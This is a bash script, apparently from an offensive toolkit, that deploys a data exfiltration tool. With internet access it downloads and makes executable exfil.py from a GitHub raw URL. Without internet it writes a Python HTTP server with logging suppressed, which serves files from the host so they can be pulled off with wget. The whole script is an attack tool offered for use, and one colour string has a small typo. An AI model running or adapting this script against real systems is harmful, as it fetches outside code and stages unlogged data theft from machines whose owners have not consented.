#!/bin/bash
#
# Exfiltration Tool Deployment Script
# Automatically deploys exfiltration tool based on internet connectivity
#

set -e

# Colors for output
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
RED='\033[0;31m'
CYAN='\033[0;36m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# GitHub repository (update with your actual repo)
GITHUB_REPO="https://raw.githubusercontent.com/mikesploitsec/exfiltration-tools/main/exfil.py"
LOCAL_SCRIPT="exfil.py"

echo -e "${CYAN}========================================${NC}"
echo -e "${CYAN}  Exfiltration Tool Deployment${NC}"
echo -e "${CYAN}========================================${NC}"
echo ""

# Function to check internet connectivity
check_internet() {
    echo -e "${CYAN}[*]${NC} Checking internet connectivity..."
    
    # Try to ping Google DNS
    if ping -c 1 -W 2 8.8.8.8 > /dev/null 2>&1; then
        echo -e "${GREEN}[+]${NC} Internet connectivity confirmed"
        return 0
    fi
    
    # Try curl to a known site
    if curl -s --max-time 3 https://www.google.com > /dev/null 2>&1; then
        echo -e "${GREEN}[+]${NC} Internet connectivity confirmed"
        return 0
    fi
    
    echo -e "${YELLOW}[!]${NC} No internet connectivity detected"
    return 1
}

# Function to download script from GitHub
download_from_github() {
    echo -e "${CYAN}[*]${NC} Downloading exfiltration script from GitHub..."
    
    if command -v curl > /dev/null 2>&1; then
        if curl -s -o "$LOCAL_SCRIPT" "$GITHUB_REPO"; then
            echo -e "${GREEN}[+]${NC} Script downloaded successfully"
            chmod +x "$LOCAL_SCRIPT"
            return 0
        fi
    elif command -v wget > /dev/null 2>&1; then
        if wget -q -O "$LOCAL_SCRIPT" "$GITHUB_REPO"; then
            echo -e "${GREEN}[+]${NC} Script downloaded successfully"
            chmod +x "$LOCAL_SCRIPT"
            return 0
        fi
    fi
    
    echo -e "${RED}[-]${NC} Failed to download script"
    return 1
}

# Function to create local HTTP server script
create_http_server_script() {
    echo -e "${CYAN}[*]${NC} Creating HTTP server fallback script..."
    
    cat > "$LOCAL_SCRIPT" << 'EOF'
#!/usr/bin/env python3
"""Simple HTTP server for file exfiltration"""
import http.server
import socketserver
import sys
import os

PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 8000
FILE = sys.argv[2] if len(sys.argv) > 2 else None

class FileHandler(http.server.SimpleHTTPRequestHandler):
    def log_message(self, format, *args):
        # Suppress default logging
        pass

if FILE and os.path.exists(FILE):
    os.chdir(os.path.dirname(os.path.abspath(FILE)))
    FILE_NAME = os.path.basename(FILE)
    print(f"[*] Serving: {FILE_NAME}")
    print(f"[*] Download with: wget http://<SERVER_IP>:{PORT}/{FILE_NAME}")
else:
    print(f"[*] Serving current directory on port {PORT}")
    print(f"[*] Access files at: http://<SERVER_IP>:{PORT}/")

Handler = FileHandler
with socketserver.TCPServer(("", PORT), Handler) as httpd:
    print(f"[+] HTTP server running on port {PORT}")
    print("[*] Press Ctrl+C to stop")
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print("\n[+] Server stopped")
EOF
    
    chmod +x "$LOCAL_SCRIPT"
    echo -e "${GREEN}[+]${NC} HTTP server script created"
}

# Main deployment logic
main() {
    # Check if Python 3 is available
    if ! command -v python3 > /dev/null 2>&1; then
        echo -e "${RED}[-]${NC} Python 3 is required but not found"
        exit 1
    fi
    
    echo -e "${CYAN}[*]${NC} Python 3 found: $(python3 --version)"
    echo ""
    
    # Check internet connectivity
    if check_internet; then
        # Method 1: Download from GitHub
        echo ""
        echo -e "${BLUE}[*]${NC} Using GitHub deployment method"
        if download_from_github; then
            echo ""
            echo -e "${GREEN}[+]${NC} Deployment complete!"
            echo -e "${CYAN}[*]${NC} Run: python3 $LOCAL_SCRIPT"
            exit 0
        else
            echo -e "${YELLOW}[!]${NC} GitHub download failed, falling back to HTTP server method"
        fi
    else
        echo ""
        echo -e "${BLUE}[*]${NC} No internet access, using HTTP server method"
    fi
    
    # Method 2: Create local HTTP server script
    create_http_server_script
    
    echo ""
    echo -e "${GREEN}[+]{NC} Deployment complete!"
    echo ""
    echo -e "${CYAN}Usage:${NC}"
    echo "  Method 1 (with internet): python3 $LOCAL_SCRIPT"
    echo "  Method 2 (HTTP server):   python3 $LOCAL_SCRIPT <port> <file>"
    echo ""
    echo -e "${CYAN}Example HTTP server:${NC}"
    echo "  python3 $LOCAL_SCRIPT 8000 /path/to/file.tar.gz"
}

main "$@"

